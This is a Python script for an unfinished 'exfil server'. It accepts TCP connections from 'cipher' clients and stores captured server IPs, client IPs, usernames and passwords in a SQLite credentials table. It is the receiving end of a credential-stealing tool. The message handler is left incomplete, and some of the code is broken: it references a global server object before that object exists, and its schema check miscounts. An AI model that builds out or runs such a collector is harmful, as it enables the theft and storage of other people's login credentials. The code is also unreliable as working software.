#!/usr/bin/env python3

import argparse
import pathlib
import socketserver
import sqlite3
import struct

from ipaddress import IPv4Address

INFO="\033[94m[i] "
SUCCESS="\033[92m[*] "
WARNING="\033[38;5;208m[WARN] "
ERROR="\033[91m[ERROR] "
RESET="\033[0m"

def valid_ip(value):
    try:
        return str(IPv4Address(value))
    except ValueError:
        raise argparse.ArgumentTypeError(f"'{value}' is not a valid IP address")

def handle_file(file):
    path = pathlib.Path(file)
    if (path.exists()):
        if (path.is_file()):
            # Ensure DB schema is valid, otherwise exit
            if (validate_db(path)):
                server.db = path
                print(f"{SUCCESS}Using existing database '{path}'{RESET}")
            else:
                print(f"{ERROR}Database validation failed. Exiting...{RESET}")
                exit(1)
        else:
            print(f"{ERROR}{path} is a directory. Exiting...")
            exit(1)
    else:
        print(f"{WARNING}Database file '{path}' not found, so it will be created{RESET}")
        if path.suffix != ".db":
            path = path.with_name(f"{path.name}.db")
        init_db(path)

def validate_db(db_name):
    print(f"{INFO}Validating database schema...{RESET}")
    with sqlite3.connect(db_name) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        table_count = cursor.execute("SELECT COUNT(*) FROM sqlite_schema")
        results = table_count.fetchall()
        if len(results) > 1:
            print(f"{WARNING}There's more than 1 table in this database{RESET}")

        tables = cursor.execute("SELECT * FROM sqlite_schema")
        for row in tables.fetchall():
            if row[1] == "credentials":
                break
        else:
            print(f"{WARNING}Table 'credentials' not found{RESET}")
            return False
        
        creds_table_schema = cursor.execute("SELECT name FROM pragma_table_info('credentials') WHERE type LIKE '%VARCHAR%' AND \"notnull\" = 1")
        results = [row for row in creds_table_schema]
        if len(results) != 4:
            print(f"{WARNING}Invalid table schema for 'credentials'. See --help for more info")
            return False

    conn.close()
    return True
    

def init_db(path):
    print(f"{INFO}Initializing new database '{path}'{RESET}")
    with sqlite3.connect(path) as conn:
        cursor = conn.cursor()
        # The planned approach to filtering results is SELECTing by server ip or username and view results that way (e.g SELECT password FROM cipher WHERE server_ip="192.168.1.5")
        # Another way to do it is to change password to passwords and collect them all in JSON so all rows represent unique IPs with all seen passwords. Same thing with the client_ip column
        cursor.execute("""
            CREATE TABLE credentials (
                server_ip VARCHAR(25) NOT NULL,
                client_ip VARCHAR(25) NOT NULL,
                username VARCHAR(50) NOT NULL,
                password VARCHAR(100) NOT NULL
            )""")
    conn.close()
    

class Handler(socketserver.StreamRequestHandler):
    timeout = 5.0

    def handle(self):
        # ----- UNFINISHED FUNCTION -----
        print(f"{SUCCESS}Connection received from {self.client_address}")
        while True:
            recv_len = self.rfile.read(4)
            if not recv_len:
                print(f"{INFO}{self.client_address}: Client disconnected")
                break
            if len(recv_len) != 4:
                print(f"{ERROR}{self.client_address}: Connection interrupted. Incomplete length prefix")
                break

            length = struct.unpack("!I", recv_len)[0]
            data = self.rfile.read(length).decode()
            if not data:
                print(f"{INFO}Client '{self.client_address}' disconnected")
                break
            if len(data) != length:
                print(f"{ERROR}{self.client_address}: Connection interrupted. Incomplete data payload")
                break

            parsed_data = data.split("|")



if __name__ == "__main__":
    epilogue = """This program defines the credentials table as the following:
    CREATE TABLE credentials (
        server_ip VARCHAR(25) NOT NULL,
        client_ip VARCHAR(25) NOT NULL,
        username VARCHAR(50) NOT NULL,
        password VARCHAR(100) NOT NULL
    );

    If the user specifies an existing database, it must contain only this table exactly as defined, otherwise the program will reject it"""

    parser = argparse.ArgumentParser(description="Accept connections from cipher clients and store creds in a sqlite3 database", formatter_class=argparse.RawDescriptionHelpFormatter, epilog=epilogue)
    parser.add_argument("server_ip", type=valid_ip, help="Server IP address")
    parser.add_argument("server_port", type=int,help="Server port")
    parser.add_argument("--db", metavar="DB_PATH", dest="db", help="Path to existing database. Creates a new one if there is none (default: ./cipher.db)")
    args = parser.parse_args()

    if (args.db):
        handle_file(args.db)
    else:
        print(f"{INFO}Checking for db file './cipher.db'{RESET}")
        handle_file("./cipher.db")

    with socketserver.ThreadingTCPServer((args.server_ip, args.server_port), Handler) as server:        
        print(f"{INFO}Exfil server listening on {args.server_ip}:{args.server_port}...{RESET}")
        server.allow_reuse_address = True
        server.serve_forever()
